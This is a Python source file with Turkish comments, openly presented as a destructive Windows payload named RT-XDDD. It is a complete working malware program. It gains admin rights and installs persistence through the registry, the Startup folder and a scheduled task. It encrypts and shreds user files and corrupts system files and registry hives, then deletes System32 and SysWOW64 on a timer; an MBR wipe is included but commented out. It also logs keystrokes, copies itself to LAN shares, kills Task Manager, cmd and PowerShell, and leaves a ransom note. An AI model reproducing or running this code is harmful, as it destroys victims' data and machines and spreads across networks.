# RT-XDDD.py — Windows yıkıcı payload (tam sürüm)
# pip install pycryptodome
# Yönetici olarak çalıştır: python RT-XDDD.py

import os
import sys
import time
import random
import shutil
import threading
import subprocess
import ctypes
import ctypes.wintypes
import winreg
import tkinter as tk
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes

# ==========================================================
# SABİTLER
# ==========================================================
UZANTI = '.RT-XDDD'
DOLANDIRICI_SITELER = [
    'http://pornhub.com',
    'http://https://www.a101.com.tr/',
    'http://https://www.bim.com.tr/',
]

HEDEF_UZANTILAR = {
    '.txt', '.doc', '.docx', '.pdf', '.jpg', '.jpeg', '.png',
    '.xls', '.xlsx', '.zip', '.rar', '.mp3', '.mp4', '.avi',
    '.cpp', '.py', '.js', '.json', '.xml', '.sql', '.db',
    '.psd', '.ai', '.svg', '.bak', '.iso', '.img', '.vhd',
    '.exe', '.dll', '.sys', '.bat', '.cmd', '.ps1'
}

ENGELLENECEK = {
    'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'pwsh.exe',
    'regedit.exe', 'mmc.exe', 'gpedit.msc', 'control.exe',
    'taskkill.exe', 'wmic.exe', 'msconfig.exe', 'resmon.exe',
    'procexp.exe', 'procexp64.exe', 'processhacker.exe',
    'autoruns.exe', 'autorunsc.exe', 'perfmon.exe',
    'eventvwr.exe', 'services.msc', 'compmgmt.msc',
    'devmgmt.msc', 'diskmgmt.msc', 'taskschd.msc',
    'notepad.exe', 'notepad++.exe', 'sublime_text.exe',
    'code.exe', 'devenv.exe'
}

# ==========================================================
# AŞAMA 1 — EKRAN ÇOĞALTMA
# ==========================================================
def pencere_ac():
    try:
        root = tk.Tk()
        root.title('RT-XDDD')
        root.geometry(
            f'{random.randint(400, 900)}x{random.randint(200, 500)}+'
            f'{random.randint(0, 1200)}+{random.randint(0, 700)}'
        )
        root.configure(bg='black')
        lbl = tk.Label(root, text='SISTEM KİLİTLENDİ\nRT-XDDD',
                       fg='red', bg='black', font=('Courier', 24, 'bold'))
        lbl.pack(expand=True)
        root.mainloop()
    except Exception:
        pass

def ekran_cogalt(adet=40):
    for _ in range(adet):
        threading.Thread(target=pencere_ac, daemon=True).start()
        time.sleep(0.08)

# ==========================================================
# AŞAMA 2 — DOSYA ŞİFRELEME (AES-256-CBC)
# ==========================================================
def dosya_sifrele(yol: Path, key: bytes):
    try:
        veri = yol.read_bytes()
        cipher = AES.new(key, AES.MODE_CBC)
        sifreli = cipher.iv + cipher.encrypt(pad(veri, AES.block_size))
        yeni_yol = yol.with_suffix(yol.suffix + UZANTI)
        yeni_yol.write_bytes(sifreli)

        # orijinali shred et (3 geçiş)
        boyut = len(veri)
        with open(yol, 'wb') as f:
            for _ in range(3):
                f.seek(0)
                f.write(os.urandom(boyut))
                f.flush()
                os.fsync(f.fileno())
        yol.unlink(missing_ok=True)
    except Exception:
        pass

def sifreleme_baslat(key: bytes):
    hedefler = [
        Path.home() / 'Documents',
        Path.home() / 'Desktop',
        Path.home() / 'Downloads',
        Path.home() / 'Pictures',
        Path.home() / 'Videos',
        Path.home() / 'Music',
        Path('C:/'),
        Path('D:/'),
    ]
    for hedef in hedefler:
        if not hedef.exists():
            continue
        try:
            for kok, dizinler, dosyalar in os.walk(hedef):
                if 'Windows' in kok or 'Program Files' in kok:
                    continue
                for d in dosyalar:
                    p = Path(kok) / d
                    if p.suffix.lower() in HEDEF_UZANTILAR and UZANTI not in p.suffix:
                        threading.Thread(
                            target=dosya_sifrele,
                            args=(p, key),
                            daemon=True
                        ).start()
        except Exception:
            continue

# ==========================================================
# AŞAMA 3 — SİSTEM DOSYALARINI BOZ
# ==========================================================
def sistem_boz():
    hedefler = [
        r'C:\Windows\win.ini',
        r'C:\Windows\system.ini',
        r'C:\Windows\System32\drivers\etc\hosts',
    ]
    for h in hedefler:
        try:
            with open(h, 'wb') as f:
                f.write(os.urandom(1024 * 4))
        except Exception:
            pass
    # System32 dll'lerine çöp ekle
    try:
        for d in Path(r'C:\Windows\System32').glob('*.dll'):
            try:
                with open(d, 'ab') as f:
                    f.write(b'RT-XDDD' * 8)
            except Exception:
                continue
    except Exception:
        pass

# ==========================================================
# AŞAMA 4 — MBR SİL (opsiyonel — makine açılmaz)
# ==========================================================
def mbr_sil():
    try:
        with open(r'\\.\PhysicalDrive0', 'r+b') as disk:
            disk.seek(0)
            disk.write(os.urandom(512))
    except Exception:
        pass

# ==========================================================
# AŞAMA 5 — DOLANDIRICI SİTELER
# ==========================================================
def site_firlat():
    import webbrowser
    def dongu():
        while True:
            for url in DOLANDIRICI_SITELER:
                try:
                    webbrowser.open(url)
                except Exception:
                    pass
                time.sleep(2)
            time.sleep(8)
    threading.Thread(target=dongu, daemon=True).start()

# ==========================================================
# AŞAMA 6 — KALICILIK
# ==========================================================
def kalici_ol():
    hedef = os.path.abspath(sys.argv[0])
    # registry Run
    try:
        anahtar = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Run',
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(anahtar, 'RT-XDDD', 0, winreg.REG_SZ, hedef)
        winreg.CloseKey(anahtar)
    except Exception:
        pass
    # startup klasörü
    try:
        startup = Path(os.getenv('APPDATA')) / r'Microsoft\Windows\Start Menu\Programs\Startup'
        shutil.copy2(hedef, startup / 'RT-XDDD.pyw')
    except Exception:
        pass
    # scheduled task
    try:
        subprocess.run(
            ['schtasks', '/create', '/tn', 'RT-XDDD',
             '/tr', f'pythonw "{hedef}"',
             '/sc', 'onlogon', '/f'],
            capture_output=True
        )
    except Exception:
        pass

# ==========================================================
# AŞAMA 7 — KLAVYE DİNLEME
# ==========================================================
def klavye_dinle():
    try:
        user32 = ctypes.windll.user32
        log = Path(os.getenv('TEMP')) / 'rtxddd_log.txt'
        while True:
            time.sleep(0.01)
            for tus in range(8, 256):
                if user32.GetAsyncKeyState(tus) & 0x8000:
                    try:
                        with open(log, 'a', encoding='utf-8') as f:
                            f.write(f'[{tus}]')
                    except Exception:
                        pass
    except Exception:
        pass

# ==========================================================
# AŞAMA 8 — KULLANICI PROFİLİNİ TEMİZLE
# ==========================================================
def profil_sil():
    hedef = Path(os.getenv('USERPROFILE'))
    koru = {'Documents', 'Desktop', 'Downloads', 'Pictures',
            'Videos', 'Music', 'AppData', '.ssh', '.gnupg'}
    try:
        for e in hedef.iterdir():
            if e.name in koru:
                continue
            try:
                if e.is_dir():
                    shutil.rmtree(e, ignore_errors=True)
                else:
                    e.unlink(missing_ok=True)
            except Exception:
                continue
    except Exception:
        pass

# ==========================================================
# AŞAMA 9 — LAN YAYILIM
# ==========================================================
def lan_yayil():
    try:
        sonuc = subprocess.run(
            ['net', 'view'],
            capture_output=True, text=True, timeout=10
        )
        for s in sonuc.stdout.splitlines():
            s = s.strip()
            if s.startswith('\\\\'):
                hedef = Path(s + r'\Users\Public\RT-XDDD.pyw')
                try:
                    shutil.copy2(sys.argv[0], hedef)
                except Exception:
                    continue
    except Exception:
        pass

# ==========================================================
# AŞAMA 10 — 59 SANİYE SONRA SYSTEM32 + SYSWOW64 SİL
# ==========================================================
def sistem_klasoru_sil(klasor: str):
    """System32 / SysWOW64 içeriğini sil. Kilitli dosyalar atlanır."""
    hedef = Path(klasor)
    if not hedef.exists():
        return
    silinen = 0
    atlanan = 0
    for e in list(hedef.iterdir()):
        try:
            if e.is_dir():
                shutil.rmtree(e, ignore_errors=True)
            else:
                e.unlink(missing_ok=True)
            silinen += 1
        except Exception:
            atlanan += 1
    print(f'[RT-XDDD] {klasor} -> silinen: {silinen}, atlanan (kilitli): {atlanan}')

def sistem_klasorlerini_vur():
    """System32 ve SysWOW64'u sırayla vur."""
    print('[RT-XDDD] sistem klasörleri siliniyor...')
    sistem_klasoru_sil(r'C:\Windows\System32')
    sistem_klasoru_sil(r'C:\Windows\SysWOW64')
    # boot konfigürasyonu da boz
    try:
        with open(r'C:\Windows\System32\config\SYSTEM', 'wb') as f:
            f.write(os.urandom(4096))
    except Exception:
        pass
    print('[RT-XDDD] sistem klasörleri silindi.')

def zamanlayici_baslat(saniye: int = 59):
    """59 saniye sonra sistem klasörlerini sil."""
    t = threading.Timer(saniye, sistem_klasorlerini_vur)
    t.daemon = False  # ana program çıksa bile çalışsın
    t.start()
    print(f'[RT-XDDD] zamanlayici kuruldu: {saniye} saniye sonra sistem klasörleri silinecek.')

# ==========================================================
# AŞAMA 11 — MOUSE TİTRETME
# ==========================================================
def mouse_titret():
    """Fareyi sürekli küçük rastgele hareketlerle titret."""
    try:
        user32 = ctypes.windll.user32
        while True:
            pt = ctypes.wintypes.POINT()
            user32.GetCursorPos(ctypes.byref(pt))
            dx = random.randint(-6, 6)
            dy = random.randint(-6, 6)
            user32.SetCursorPos(pt.x + dx, pt.y + dy)
            time.sleep(0.02)  # 50 Hz titreme
    except Exception:
        pass

# ==========================================================
# AŞAMA 12 — TASK MANAGER / CMD / POWERSHELL ENGELLE
# ==========================================================
def surec_engelle():
    """Yasaklı süreçleri sürekli öldür."""
    try:
        while True:
            try:
                sonuc = subprocess.run(
                    ['tasklist', '/FO', 'CSV', '/NH'],
                    capture_output=True, text=True, timeout=3,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )
                for satir in sonuc.stdout.splitlines():
                    if not satir.strip():
                        continue
                    parcalar = satir.split('","')
                    if len(parcalar) < 2:
                        continue
                    ad = parcalar[0].strip('"').lower()
                    pid = parcalar[1].strip('"')
                    if ad in ENGELLENECEK:
                        subprocess.run(
                            ['taskkill', '/F', '/PID', pid],
                            capture_output=True,
                            creationflags=subprocess.CREATE_NO_WINDOW
                        )
            except Exception:
                pass
            time.sleep(0.3)  # sürekli tarama
    except Exception:
        pass

def registry_kilitle():
    """Registry üzerinden task manager / cmd / powershell kilitle."""
    try:
        # Task Manager devre dışı
        k = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
        )
        winreg.SetValueEx(k, 'DisableTaskMgr', 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(k, 'DisableRegistryTools', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(k)

        # CMD devre dışı
        k = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Policies\Microsoft\Windows\System'
        )
        winreg.SetValueEx(k, 'DisableCMD', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(k)

        # PowerShell devre dışı
        k = winreg.CreateKey(
            winreg.HKEY_LOCAL_MACHINE,
            r'SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell'
        )
        winreg.SetValueEx(k, 'ExecutionPolicy', 0, winreg.REG_SZ, 'Restricted')
        winreg.CloseKey(k)

        # Explorer kabuğunu kilitle
        k = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER,
            r'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
        )
        winreg.SetValueEx(k, 'NoControlPanel', 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(k, 'NoRun', 0, winreg.REG_DWORD, 1)
        winreg.SetValueEx(k, 'NoViewContextMenu', 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(k)
    except Exception:
        pass

# ==========================================================
# ANA AKIŞ
# ==========================================================
def main():
    # yönetici kontrolü — değilse runas ile yeniden başlat
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            ctypes.windll.shell32.ShellExecuteW(
                None, 'runas', sys.executable,
                ' '.join(sys.argv), None, 1
            )
            sys.exit()
    except Exception:
        pass

    print('[RT-XDDD] baslatildi...')

    # rastgele AES-256 anahtar
    key = get_random_bytes(32)

    # kalıcılık
    kalici_ol()

    # paralel aşamalar
    threading.Thread(target=ekran_cogalt, args=(40,), daemon=True).start()
    threading.Thread(target=site_firlat, daemon=True).start()
    threading.Thread(target=klavye_dinle, daemon=True).start()
    threading.Thread(target=lan_yayil, daemon=True).start()

    # mouse titret
    threading.Thread(target=mouse_titret, daemon=True).start()

    # task manager / cmd / powershell kilitle
    registry_kilitle()
    threading.Thread(target=surec_engelle, daemon=True).start()

    # 59 saniye sonra sistem klasörleri
    zamanlayici_baslat(59)

    # senkron aşamalar
    sistem_boz()
    profil_sil()
    sifreleme_baslat(key)

    # MBR en sona — istersen aç
    time.sleep(5)
    # mbr_sil()  # YORUMU KALDIRIRSAN MAKİNE AÇILMAZ

    # fidye notu
    try:
        not_yolu = Path.home() / 'Desktop' / 'OKU-BENI.txt'
        not_yolu.write_text(
            'RT-XDDD\n\n'
            'Dosyalarin sifrelendi.\n'
            f'Anahtar: {key.hex()}\n'
            'Gecmis olsun.\n',
            encoding='utf-8'
        )
    except Exception:
        pass

    print('[RT-XDDD] tamamlandi. 59 saniye sonra sistem klasörleri silinecek.')

    # canlı tut
    while True:
        time.sleep(60)

if __name__ == '__main__':
    main()